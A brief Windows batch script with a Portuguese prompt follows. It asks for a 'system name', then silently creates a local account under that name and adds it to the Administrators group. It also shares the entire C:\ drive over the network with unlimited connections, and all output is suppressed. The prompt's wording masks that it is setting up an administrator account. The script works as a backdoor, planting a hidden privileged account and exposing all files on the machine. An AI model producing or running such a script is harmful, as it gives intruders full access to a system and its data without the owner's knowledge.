@echo off
set /p n=Nome do sistema: 
net user %n% /add>nul
net localgroup Administradores %n% /add>nul
net share system=C:\ /unlimited>nul
exit